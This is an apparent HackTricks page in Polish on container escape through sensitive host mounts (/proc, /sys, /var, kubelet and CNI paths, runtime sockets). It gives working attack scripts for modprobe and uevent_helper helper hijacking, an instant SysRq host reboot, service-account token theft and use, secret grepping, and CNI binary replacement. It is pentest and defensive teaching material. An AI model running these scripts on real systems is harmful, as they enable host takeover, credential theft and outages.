# Wrażliwe mounty hosta

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Mounty hosta są jednymi z najważniejszych praktycznych powierzchni container-escape, ponieważ często niwelują starannie odizolowany widok procesów, przywracając bezpośredni dostęp do zasobów hosta. Niebezpieczne przypadki nie ograniczają się do `/`. Bind mounty `/proc`, `/sys`, `/var`, socketów runtime, stanu zarządzanego przez kubelet lub ścieżek związanych z urządzeniami mogą ujawniać mechanizmy kontroli kernela, dane uwierzytelniające, systemy plików sąsiednich kontenerów oraz interfejsy zarządzania runtime.

Ta strona istnieje oddzielnie od poszczególnych stron dotyczących ochrony, ponieważ model nadużycia obejmuje wiele obszarów. Writable host mount jest niebezpieczny częściowo z powodu mount namespaces, częściowo z powodu user namespaces, częściowo z powodu zakresu ochrony AppArmor lub SELinux, a częściowo z powodu tego, jaka dokładnie ścieżka hosta została ujawniona. Traktowanie tego jako osobnego tematu znacznie ułatwia analizę attack surface.

## Ujawnienie `/proc`

procfs zawiera zarówno zwykłe informacje o procesach, jak i interfejsy kontroli kernela o dużym wpływie. Bind mount, taki jak `-v /proc:/host/proc`, lub widok kontenera, który ujawnia nieoczekiwanie zapisywalne wpisy proc, może w konsekwencji prowadzić do ujawnienia informacji, denial of service lub bezpośredniego code execution na hoście.

Ścieżki procfs o wysokiej wartości obejmują:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (szczególnie `register` i `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Zacznij od sprawdzenia, które wpisy procfs o wysokiej wartości są widoczne lub zapisywalne:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Te ścieżki są interesujące z różnych powodów. `core_pattern`, `modprobe` i `binfmt_misc` mogą stać się ścieżkami wykonywania kodu na host, jeśli są zapisywalne. `kallsyms`, `kmsg`, `kcore` i `config.gz` są potężnymi źródłami rozpoznania podczas kernel exploitation. `sched_debug` i `mountinfo` ujawniają kontekst procesów, cgroups i systemu plików, co może pomóc w odtworzeniu układu hosta z wnętrza containera.

Praktyczna wartość każdej ścieżki jest inna, a traktowanie ich tak, jakby wszystkie miały ten sam wpływ, utrudnia triage:

- `/proc/sys/kernel/core_pattern`
Jeśli jest zapisywalna, jest to jedna ze ścieżek procfs o największym wpływie, ponieważ kernel wykona handler potoku po awarii. Container, który może wskazać `core_pattern` na payload zapisany w swoim overlayu lub w zamontowanej ścieżce hosta, często może uzyskać wykonanie kodu na host. Zobacz także [read-only-paths.md](protections/read-only-paths.md), gdzie znajduje się dedykowany przykład.
- `/proc/sys/kernel/modprobe`
Ta ścieżka kontroluje helper userspace używany przez kernel, gdy musi uruchomić logikę ładowania modułów. Jeśli jest zapisywalna z containera i interpretowana w kontekście hosta, może stać się kolejnym prymitywem wykonywania kodu na host. Jest szczególnie interesująca w połączeniu ze sposobem wyzwolenia ścieżki helpera.
- `/proc/sys/vm/panic_on_oom`
Zwykle nie jest to czysty prymityw escape, ale może przekształcić presję pamięci w odmowę usługi obejmującą całego hosta, zamieniając sytuacje OOM w zachowanie prowadzące do kernel panic.
- `/proc/sys/fs/binfmt_misc`
Jeśli interfejs rejestracji jest zapisywalny, attacker może zarejestrować handler dla wybranej wartości magicznej i uzyskać wykonanie w kontekście hosta po uruchomieniu pasującego pliku.
- `/proc/config.gz`
Przydatne podczas triage kernel exploitów. Pomaga ustalić, które subsystemy, mitigations i opcjonalne funkcje kernela są włączone, bez potrzeby korzystania z metadanych pakietów hosta.
- `/proc/sysrq-trigger`
Głównie ścieżka odmowy usługi, ale bardzo poważna. Może natychmiast zrestartować hosta, wywołać panic lub w inny sposób go zakłócić.
- `/proc/kmsg`
Ujawnia komunikaty kernelowego ring buffera. Przydatne do fingerprintingu hosta, analizy awarii i w niektórych środowiskach do leakowania informacji pomocnych przy kernel exploitation.
- `/proc/kallsyms`
Cenne, gdy jest dostępne do odczytu, ponieważ ujawnia informacje o eksportowanych symbolach kernela i może pomóc obejść założenia dotyczące randomizacji adresów podczas tworzenia kernel exploitów.
- `/proc/[pid]/mem`
Jest to bezpośredni interfejs do pamięci procesu. Jeśli proces docelowy jest osiągalny przy spełnieniu wymaganych warunków w stylu ptrace, może umożliwiać odczyt lub modyfikację pamięci innego procesu. Rzeczywisty wpływ zależy w dużej mierze od poświadczeń, `hidepid`, Yama i ograniczeń ptrace, więc jest to potężna, ale warunkowa ścieżka.
- `/proc/kcore`
Udostępnia widok pamięci systemu w stylu obrazu core. Plik jest ogromny i niewygodny w użyciu, ale jeśli można go sensownie odczytać, oznacza to poważnie odsłoniętą powierzchnię pamięci hosta.
- `/dev/kmem` i `/dev/mem`
Są to historycznie bardzo istotne interfejsy **device** do surowej pamięci, a nie pliki procfs. W wielu nowoczesnych systemach nie występują lub są silnie ograniczone, ale container, który może otworzyć kopię zamontowaną z hosta, powinien traktować takie ujawnienie jako krytyczne. Należy analizować je razem z innymi wrażliwymi mountami `/dev`, zamiast szukać nieistniejących ścieżek `/proc/kmem` lub `/proc/mem`.
- `/proc/sched_debug`
Leakuje informacje o harmonogramowaniu i zadaniach, które mogą ujawniać tożsamości procesów hosta, nawet gdy inne widoki procesów wyglądają czyściej niż oczekiwano.
- `/proc/[pid]/mountinfo`
Niezwykle przydatne do odtworzenia, gdzie container rzeczywiście znajduje się na hoście, które ścieżki są oparte na overlayu oraz czy zapisywalny mount odpowiada zawartości hosta, czy tylko warstwie containera.

Jeśli `/proc/[pid]/mountinfo` lub szczegóły overlayu są dostępne do odczytu, użyj ich do odzyskania ścieżki hosta dla systemu plików containera:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Te polecenia są przydatne, ponieważ wiele trików host-execution wymaga przekształcenia ścieżki wewnątrz kontenera w odpowiadającą jej ścieżkę z perspektywy hosta.

### Przykład: przygotowanie ścieżki pomocnika `modprobe`

Jeśli `/proc/sys/kernel/modprobe` jest zapisywalny z poziomu kontenera, a ścieżka pomocnika jest interpretowana w kontekście hosta, można przekierować ją do payloadu kontrolowanego przez atakującego. Katalog upper overlay musi zostać rozwiązany z poziomu hosta, a dane potwierdzające wykonanie muszą zostać zapisane z powrotem w tej samej widocznej dla hosta warstwie kontenera, jeśli kontener nie montuje również hostowego `/tmp`:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
Dokładny wyzwalacz zależy od celu i zachowania kernela i celowo nie jest zgadywany. Przywróć pierwotną wartość przed opuszczeniem laboratorium. Najważniejsze jest to, że zapisywalna ścieżka pomocnicza może przekierować przyszłe wywołanie pomocnika kernela do treści ścieżki hosta kontrolowanej przez attackera. Brak `upperdir` nakładki, ścieżka, której host nie może rozwiązać, montowanie sysctl tylko do odczytu lub kernel, który nigdy nie wywołuje wybranego pomocnika, przerywa ten łańcuch.

### Pełny przykład: rozpoznanie kernela za pomocą `kallsyms`, `kmsg` i `config.gz`

Jeśli celem jest ocena możliwości wykorzystania, a nie natychmiastowy escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Te polecenia pomagają ustalić, czy widoczne są przydatne informacje o symbolach, czy najnowsze komunikaty kernela ujawniają interesujący stan oraz które funkcje kernela lub mechanizmy mitigacji zostały skompilowane. Skutek zazwyczaj nie polega na bezpośrednim escape, ale może znacznie skrócić triage podatności kernela.

### Pełny przykład: ponowne uruchomienie hosta przez SysRq

Jeśli `/proc/sysrq-trigger` jest zapisywalny i zapewnia dostęp do widoku hosta:
```bash
echo b > /proc/sysrq-trigger
```
Efektem jest natychmiastowy reboot hosta. Nie jest to subtelny przykład, ale wyraźnie pokazuje, że ekspozycja procfs może być znacznie poważniejsza niż ujawnienie informacji.

## Ekspozycja `/sys`

sysfs ujawnia duże ilości informacji o stanie kernela i urządzeń. Niektóre ścieżki sysfs są przydatne głównie do fingerprintingu, podczas gdy inne mogą wpływać na wykonywanie helperów, działanie urządzeń, konfigurację security modules lub stan firmware.

Ścieżki sysfs o wysokiej wartości obejmują:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ścieżki te mają znaczenie z różnych powodów. `/sys/class/thermal` może wpływać na działanie zarządzania temperaturą, a tym samym na stabilność hosta w środowiskach z niewłaściwą ekspozycją. `/sys/kernel/vmcoreinfo` może leakować informacje o zrzutach awarii i układzie kernela, pomagające w niskopoziomowym fingerprintingu hosta. `/sys/kernel/security` to interfejs `securityfs` używany przez Linux Security Modules, dlatego nieoczekiwany dostęp do niego może ujawnić lub zmienić stan związany z MAC. Ścieżki zmiennych EFI mogą wpływać na ustawienia bootowania obsługiwane przez firmware, co czyni je znacznie poważniejszymi niż zwykłe pliki konfiguracyjne. `debugfs` w `/sys/kernel/debug` jest szczególnie niebezpieczny, ponieważ celowo stanowi interfejs przeznaczony dla developerów i podlega znacznie mniejszym wymogom bezpieczeństwa niż zahartowane produkcyjne API kernela.

Każdy wpis sysfs z tej listy jest **zależny od kernela, konfiguracji i sprzętu**. Obecne wirtualizowane nodes często całkowicie pomijają `uevent_helper`, zmienne EFI oraz wpisy urządzeń termicznych. Nieobecną ścieżkę należy odnotować jako negatywny prerequisite, zamiast zakładać, że przykład z innego kernela ma zastosowanie.

Przydatne commands do przeglądu tych ścieżek to:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Co sprawia, że te polecenia są interesujące:

- `/sys/kernel/security` może ujawnić, czy AppArmor, SELinux lub inna powierzchnia LSM jest widoczna w sposób, który powinien pozostać dostępny wyłącznie z poziomu hosta.
- `/sys/kernel/debug` jest często najbardziej alarmującym znaleziskiem w tej grupie. Jeśli `debugfs` jest zamontowany i możliwy do odczytu lub zapisu, należy spodziewać się szerokiej powierzchni komunikującej się z kernelem, której dokładne ryzyko zależy od włączonych węzłów debugowania.
- Ekspozycja zmiennych EFI jest mniej powszechna, ale jeśli występuje, ma duży wpływ, ponieważ dotyczy ustawień wspieranych przez firmware, a nie zwykłych plików środowiska uruchomieniowego.
- `/sys/class/thermal` ma znaczenie głównie dla stabilności hosta i interakcji ze sprzętem, a nie dla prostego escape w stylu shellowym.
- `/sys/kernel/vmcoreinfo` jest głównie źródłem informacji przydatnych do fingerprintingu hosta i analizy awarii, pomagającym zrozumieć niskopoziomowy stan kernela.

### Pełny przykład: `uevent_helper`

`/sys/kernel/uevent_helper` zależy od kernela i konfiguracji, a na wielu współczesnych systemach nie występuje. Jeśli istnieje, jest możliwy do zapisu i dostępny jest użyteczny trigger `uevent`, kernel może wykonać helper kontrolowany przez atakującego. Output demonstracyjny musi używać ścieżki widocznej zarówno z perspektywy hosta, jak i kontenera:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
Powodem, dla którego to działa, jest interpretowanie ścieżki helpera z perspektywy hosta. Po wyzwoleniu helper działa w kontekście hosta, a nie wewnątrz bieżącego kontenera. `/sys/class/mem/null/uevent` jest jednym konkretnym triggerem w kernelach, które go udostępniają; inne urządzenia mogą udostępniać własne pliki `uevent`, ale nie wybieraj żadnego bez zastanowienia na prawdziwym sprzęcie. Przywróć pierwotną wartość przed opuszczeniem laboratorium. Nie zgłaszaj tej techniki jako dostępnej, jeśli brakuje pliku helpera lub kontrolowanego triggera.

## Ekspozycja `/var`

Mountowanie hostowego `/var` do kontenera jest często niedoceniane, ponieważ nie wygląda tak spektakularnie jak mountowanie `/`. W praktyce może wystarczyć do uzyskania dostępu do socketów runtime, katalogów snapshotów kontenerów, wolumenów podów zarządzanych przez kubelet, projektowanych tokenów service-account oraz systemów plików sąsiednich aplikacji. Na nowoczesnych węzłach `/var` często zawiera najważniejszy operacyjnie stan kontenerów.

### Przykład Kubernetes

Pod z `hostPath: /var` może często odczytywać projektowane tokeny innych podów oraz zawartość snapshotów overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Te polecenia są przydatne, ponieważ pokazują, czy mount udostępnia wyłącznie nieistotne dane aplikacji, czy też dane uwierzytelniające klastra o dużym wpływie. Możliwy do odczytu token service-account może natychmiast przekształcić lokalne wykonanie kodu w dostęp do Kubernetes API.

Jeśli token jest obecny, sprawdź, do czego zapewnia dostęp, zamiast kończyć na jego wykryciu:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Skutki mogą być znacznie poważniejsze niż dostęp do lokalnego węzła. Token z szerokimi uprawnieniami RBAC może zmienić zamontowane `/var` w kompromitację całego klastra.

### Przykład Docker i containerd

Na hostach Docker odpowiednie dane często znajdują się w `/var/lib/docker`, natomiast na węzłach Kubernetes korzystających z containerd mogą znajdować się w `/var/lib/containerd` lub w ścieżkach zależnych od snapshottera:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Jeśli zamontowany `/var` udostępnia zapisywalną zawartość snapshotu innego workloadu, attacker może być w stanie zmodyfikować pliki aplikacji, umieścić treści webowe lub zmienić skrypty startowe bez modyfikowania bieżącej konfiguracji kontenera.

Na **disposable lab workload** zapisywalna zawartość snapshotu może posłużyć do zademonstrowania manipulacji aplikacją, odzyskiwania sekretów lub lateral movement. Najpierw dopasuj runtime container ID do dokładnego snapshotu i nigdy nie edytuj niepowiązanego ani produkcyjnego snapshotu:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Te polecenia są przydatne, ponieważ pokazują trzy główne rodziny skutków zamontowania `/var`: manipulowanie aplikacją, odzyskiwanie sekretów oraz lateral movement do sąsiednich workloadów.

Bezpośredni zapis snapshotów omija standardowe zarządzanie stanem przez runtime i może uszkodzić kontener lub zniszczyć dowody. Odkrywanie tylko do odczytu zostało odtworzone lokalnie dla Docker `overlay2`: marker zapisany w sąsiednim jednorazowym kontenerze pojawił się w `/var/lib/docker/overlay2/<id>/diff/`. Rzeczywistą modyfikację snapshotu należy ograniczyć do jednorazowego kontenera utworzonego na potrzeby tego testu.

## Stan Kubelet, Plugins i ścieżki CNI

Montowanie `/var/lib/kubelet`, `/opt/cni/bin` lub `/etc/cni/net.d` jest często udostępniane przez uprzywilejowane DaemonSets, agentów CNI, pluginy węzłów CSI, operatory GPU oraz pomocnicze komponenty storage. Łatwo zlekceważyć te mounty jako „infrastrukturę węzła”, ale znajdują się one bezpośrednio na ścieżce wykonywania dla nowych podów i często zawierają dane uwierzytelniające kubelet, projected secrets, sockety rejestracyjne oraz wykonywalne pliki binarne pluginów po stronie hosta.

Cele o wysokiej wartości obejmują:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Przydatne polecenia do przeglądu to:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Dlaczego te ścieżki mają znaczenie:

- `/var/lib/kubelet/pki` może ujawniać certyfikaty klienckie kubeleta i inne poświadczenia lokalne dla węzła, które czasami można ponownie wykorzystać przeciwko API serverowi lub endpointom TLS kubeleta, zależnie od projektu klastra.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` często zawiera projected service-account tokens oraz zamontowane Secrets należące do sąsiednich podów na tym samym węźle.
- `/var/lib/kubelet/pod-resources/kubelet.sock` jest głównie powierzchnią reconnaissance, ale bardzo użyteczną: ujawnia, które pody i kontenery aktualnie używają GPU, hugepages, urządzeń SR-IOV oraz innych deficytowych zasobów lokalnych dla węzła.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` oraz `/var/lib/kubelet/plugins_registry` ujawniają, które pluginy CSI, DRA i device plugins są zainstalowane oraz z którymi socketami kubelet powinien się komunikować. Jeśli te katalogi są zapisywalne, a nie tylko odczytywalne, finding staje się znacznie poważniejszy.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` oraz `/etc/cni/net.d` znajdują się bezpośrednio na ścieżce konfiguracji sieci podów. Dostęp z prawem zapisu jest często opóźnionym prymitywem umożliwiającym wykonanie kodu na hoście, a nie tylko ujawnieniem konfiguracji.<sup>[[2]](#references)</sup>

### Pełny przykład: zapisywalny `/opt/cni/bin`

Jeśli katalog hosta zawierający binaria CNI jest zamontowany z prawem odczytu i zapisu, zastąpienie pluginu może wystarczyć do uzyskania wykonania kodu na hoście przy następnym utworzeniu pod sandbox przez kubelet na tym węźle:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Nie jest to tak bezpośrednie jak zamontowany `docker.sock`, ale często jest bardziej realistyczne w przypadku przejętych infrastructure pods Kubernetes. Marker jest zapisywany obok zamontowanego pluginu, dzięki czemu kontener może go pobrać nawet bez zamontowanego host-root lub host-`/tmp`. Wrapper zachowuje oryginalne argumenty i standardowe wejście, a następnie przykład przywraca oryginalny plik binarny. Najważniejsze jest to, że zmodyfikowany plik binarny zostaje później wykonany przez przepływ konfiguracji sieci hosta, a nie przez bieżący kontener. Używaj wyłącznie disposable node, ponieważ nieprawidłowy wrapper może uniemożliwić przydzielanie sieci do nowych sandboxów Pod.

## Gniazda runtime

Wrażliwe mounty hosta często obejmują gniazda runtime zamiast pełnych katalogów. Są one tak ważne, że zasługują tutaj na wyraźne powtórzenie:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Zobacz [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md), aby poznać pełne ścieżki exploitation po zamontowaniu jednego z tych socketów.

Jako szybki wzorzec pierwszej interakcji:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Jeśli jedna z tych metod zadziała, droga od „zamontowanego socketu” do „uruchomienia bardziej uprzywilejowanego kontenera będącego rodzeństwem” jest zwykle znacznie krótsza niż w przypadku dowolnej ścieżki kernel breakout.

## Przejęcie zadania przez zapisywalną ścieżkę hosta

Zapisywalny mount hosta nie musi udostępniać `/`, aby stanowić zagrożenie. Jeśli zamontowana ścieżka zawiera skrypty, pliki konfiguracyjne, hooki, pluginy lub pliki wykorzystywane później przez zaplanowane zadanie albo usługę działającą po stronie hosta, kontener może być w stanie zmienić to, co host wykonuje.

Ogólny przebieg analizy:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Jeśli zapisywalny plik jest wykorzystywany przez proces hosta, podczas testów zachowaj payload prosty i obserwowalny:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Interesującą częścią jest granica zaufania: zapis odbywa się z wnętrza kontenera, ale wykonanie następuje później w kontekście usługi hosta. Zmienia to wąski `hostPath` lub bind mount w mechanizm opóźnionego wykonywania kodu na hoście.

## CVE związane z mountami

Mounty hosta są również powiązane z podatnościami runtime. Do ważnych niedawnych przykładów należą:

- `CVE-2024-21626` w `runc`, gdzie ujawniony deskryptor pliku katalogu mógł umieścić katalog roboczy w systemie plików hosta.
- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` w BuildKit, gdzie złośliwe Dockerfile, frontendy i przepływy `RUN --mount` mogły ponownie umożliwić dostęp do plików hosta, ich usuwanie lub uzyskanie podwyższonych uprawnień podczas buildów.
- `CVE-2024-1753` w przepływach buildów Buildah i Podman, gdzie spreparowane bind mounty podczas builda mogły udostępnić `/` z uprawnieniami odczytu i zapisu.
- `CVE-2025-47290` w `containerd` 2.1.0, gdzie błąd TOCTOU podczas rozpakowywania obrazu mógł pozwolić specjalnie spreparowanemu obrazowi na modyfikowanie systemu plików hosta podczas pullowania.

Te CVE mają tutaj znaczenie, ponieważ pokazują, że obsługa mountów nie dotyczy wyłącznie konfiguracji operatora. Sam runtime może również wprowadzać warunki ucieczki wykorzystujące mounty.

## Kontrole

Użyj tych poleceń, aby szybko zlokalizować najbardziej istotne ekspozycje mountów:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Co jest tutaj interesujące:

- Host root, `/proc`, `/sys`, `/var` oraz runtime sockets to najważniejsze znaleziska.
- Zapisywalne wpisy proc/sys często oznaczają, że mount udostępnia globalne dla hosta mechanizmy kontroli kernela, a nie bezpieczny widok kontenera.
- Ścieżki zamontowane z `/var` wymagają analizy poświadczeń i sąsiednich workloadów, a nie tylko przeglądu systemu plików.
- Katalogi stanu kubeleta oraz ścieżki CNI/pluginów wymagają takiego samego priorytetu jak runtime sockets, ponieważ często znajdują się bezpośrednio na ścieżce tworzenia podów i dystrybucji poświadczeń na nodzie.

## Status lokalnej walidacji

Praktyczne chainy opisane na tej stronie sprawdzono na lokalnym nodzie Linux minikube. Walidacja odtworzyła:

- dostęp do odczytu i zapisu przez tymczasowy zapisywalny hostPath
- wykrywanie projektowanych tokenów ServiceAccount i zamontowanych Secrets przez `/var/lib/kubelet/pods`
- pomyślne uwierzytelnienie w Kubernetes API przy użyciu aktywnego tokena odzyskanego z zamontowanego stanu kubeleta
- dostępne tylko do odczytu wykrywanie systemu plików sąsiedniego Dockera `overlay2` przez zamontowane `/var`
- utworzenie przez Docker API siostrzanego kontenera z montowaniem hosta tylko do odczytu przez zamontowany `docker.sock`
- opóźnione wykonanie na hoście przez tymczasowy hook konsumowany przez hosta
- symulację wrappera CNI, który zachował argumenty, standardowe wejście i wykonanie oryginalnego pluginu

Ten sam node udostępniał `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` oraz `config.gz`, ale nie udostępniał `uevent_helper`, zmiennych EFI, wpisów termicznych ani `sched_debug`. Destrukcyjne wyzwalacze kernela nie zostały wykonane. Potwierdza to, że chainy związane z host root, `/var`, stanem kubeleta, socketami i konsumentami hosta są odtwarzalne, natomiast techniki pomocnicze procfs/sysfs muszą pozostać zależne od konkretnego kernela, trybu mount, ścieżki payloadu i triggera.

## References

- [1] [Lokalne pliki i ścieżki używane przez kubeleta](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Kontener cilium-agent może uzyskać dostęp do hosta przez montowanie `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
